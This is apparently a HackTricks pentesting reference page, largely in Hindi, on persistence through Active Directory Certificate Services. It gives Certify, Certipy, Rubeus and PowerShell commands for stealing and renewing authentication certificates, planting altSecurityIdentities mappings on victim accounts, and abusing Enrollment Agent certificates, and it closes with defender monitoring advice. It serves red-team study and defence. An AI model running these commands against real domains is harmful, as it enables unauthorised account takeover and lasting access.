# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**यह [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) के शानदार शोध के account persistence अध्यायों का छोटा सारांश है**

## Understanding Active User Credential Theft with Certificates – PERSIST1

ऐसे परिदृश्य में जहाँ कोई user ऐसा certificate request कर सकता है जो domain authentication की अनुमति देता है, attacker के पास इस certificate को request करके चोरी करने और नेटवर्क पर persistence बनाए रखने का मौका होता है। डिफ़ॉल्ट रूप से Active Directory में `User` template ऐसे अनुरोधों की अनुमति देता है, हालांकि यह कभी-कभी disabled हो सकता है।

[Certify](https://github.com/GhostPack/Certify) या [Certipy](https://github.com/ly4k/Certipy) का उपयोग करके, आप client authentication की अनुमति देने वाले enabled templates खोज सकते हैं और फिर उनमें से एक को request कर सकते हैं:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
एक प्रमाणपत्र की शक्ति इस बात में है कि यह उस उपयोगकर्ता के रूप में प्रमाणीकृत कर सकता है जिससे यह संबंधित है, पासवर्ड बदलने से प्रभाव नहीं पड़ता, जब तक प्रमाणपत्र मान्य रहता है।

आप PEM को PFX में बदलकर इसका उपयोग TGT प्राप्त करने के लिए कर सकते हैं:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> नोट: अन्य तकनीकों के साथ मिलकर (देखें THEFT sections), सर्टिफिकेट-आधारित प्रमाणीकरण LSASS को छुए बिना और यहां तक कि बिना उच्चाधिकार वाले संदर्भों से भी स्थायी पहुँच की अनुमति देता है।

## प्रमाणपत्रों के साथ मशीन पर स्थायी पहुँच प्राप्त करना - PERSIST2

यदि किसी होस्ट पर हमलावर के पास उच्चाधिकार हैं, तो वे समझौता किए गए सिस्टम के machine खाते के लिए डिफ़ॉल्ट `Machine` टेम्पलेट का उपयोग करके एक प्रमाणपत्र के लिए enroll कर सकते हैं। मशीन के रूप में प्रमाणीकरण करने से स्थानीय सेवाओं के लिए S4U2Self सक्षम होता है और यह होस्ट पर टिकाऊ स्थायी पहुँच प्रदान कर सकता है:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Extending Persistence Through Certificate Renewal - PERSIST3

प्रमाणपत्र टेम्पलेट्स की वैधता और नवीनीकरण अवधियों का दुरुपयोग एक हमलावर को दीर्घकालिक पहुँच बनाए रखने की अनुमति देता है। यदि आपके पास पहले से जारी किया गया प्रमाणपत्र और उसकी निजी कुंजी मौजूद है, तो आप इसकी समाप्ति से पहले इसे नवीनीकृत कर सकते हैं और बिना मूल प्रिंसिपल से जुड़े अतिरिक्त अनुरोध अवशेष छोड़े एक नया, दीर्घकालिक क्रेडेंशियल प्राप्त कर सकते हैं।
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> ऑपरेशनल टिप: attacker-held PFX फ़ाइलों की lifetimes ट्रैक करें और जल्दी renew करें। Renewal से अपडाटेड certificates में modern SID mapping extension शामिल हो सकता है, जिससे वे stricter DC mapping rules के तहत भी उपयोगी बने रहते हैं (देखें अगला सेक्शन)।

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

यदि आप किसी target account के `altSecurityIdentities` attribute में लिख सकते हैं, तो आप एक attacker-controlled certificate को उस account से स्पष्ट रूप से मैप कर सकते हैं। यह password changes के बाद भी बरकरार रहता है और मजबूत mapping formats का उपयोग करने पर आधुनिक DC enforcement के तहत भी कार्यशील रहता है।

High-level flow:

1. अपना नियंत्रण वाला client-auth certificate प्राप्त करें या जारी करें (उदा., `User` template के तहत खुद को enroll करें)।
2. cert से एक मजबूत identifier निकालें (Issuer+Serial, SKI, या SHA1-PublicKey)।
3. उस identifier का उपयोग करते हुए victim principal के `altSecurityIdentities` में एक explicit mapping जोड़ें।
4. अपने certificate के साथ authenticate करें; DC इसे explicit mapping के माध्यम से victim से map कर देगा।

उदाहरण (PowerShell) — एक मजबूत Issuer+Serial mapping का उपयोग करते हुए:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
फिर अपने PFX से प्रमाणीकृत करें। Certipy सीधे एक TGT प्राप्त करेगा:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### मजबूत `altSecurityIdentities` मैपिंग्स बनाना

व्यवहार में, **Issuer+Serial** और **SKI** मैपिंग्स attacker-held certificate से बनाने के लिए सबसे आसान मजबूत प्रारूप हैं। यह **February 11, 2025** के बाद मायने रखता है, जब DCs डिफ़ॉल्ट रूप से **Full Enforcement** पर सेट हो जाएंगे और कमजोर मैपिंग्स भरोसेमंद नहीं रहेंगी।
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
नोट्स
- केवल मजबूत मैपिंग प्रकारों का उपयोग करें: `X509IssuerSerialNumber`, `X509SKI`, या `X509SHA1PublicKey`। कमजोर फॉर्मैट्स (Subject/Issuer, Subject-only, RFC822 email) अप्रचलित हैं और DC नीति द्वारा ब्लॉक किए जा सकते हैं।
- यह मैपिंग दोनों **उपयोगकर्ता** और **कंप्यूटर** ऑब्जेक्ट्स पर काम करती है, इसलिए किसी कंप्यूटर अकाउंट के `altSecurityIdentities` पर लिखने की अनुमति उस मशीन के रूप में स्थायी रहने के लिए पर्याप्त है।
- सर्टिफिकेट चेन को उस रूट तक बनना चाहिए जिस पर DC भरोसा करता है। NTAuth में Enterprise CAs सामान्यतः भरोसेमंद होते हैं; कुछ वातावरण सार्वजनिक CAs को भी भरोसा करते हैं।
- Schannel authentication पर्सिस्टेंस के लिए तब भी उपयोगी रहती है जब PKINIT असफल हो जाता है क्योंकि DC में Smart Card Logon EKU नहीं है या वह `KDC_ERR_PADATA_TYPE_NOSUPP` लौटाता है।

कमज़ोर स्पष्ट मैपिंग्स और आक्रमण पथों के बारे में अधिक के लिए देखें:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

यदि आप एक वैध Certificate Request Agent/Enrollment Agent प्रमाणपत्र प्राप्त कर लेते हैं, तो आप उपयोगकर्ताओं की ओर से इच्छानुसार नए लॉग-ऑन सक्षम प्रमाणपत्र जेनरेट कर सकते हैं और agent PFX को ऑफ़लाइन पर्सिस्टेंस टोकन के रूप में रख सकते हैं। दुरुपयोग वर्कफ़्लो:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Revocation of the agent certificate or template permissions is required to evict this persistence.

ऑपरेशनल नोट्स
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:

- Pre-2022 certificates that lack the SID mapping extension may fail implicit mapping when DCs are in Full Enforcement. Attackers can maintain access by either renewing certificates through AD CS (to obtain the SID extension) or by planting a strong explicit mapping in `altSecurityIdentities` (PERSIST4).
- Explicit mappings using strong formats (Issuer+Serial, SKI, SHA1-PublicKey) continue to work. Weak formats (Issuer/Subject, Subject-only, RFC822) can be blocked and should be avoided for persistence.

Administrators should monitor and alert on:
- Changes to `altSecurityIdentities` and issuance/renewals of Enrollment Agent and User certificates.
- CA issuance logs for on-behalf-of requests and unusual renewal patterns.

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
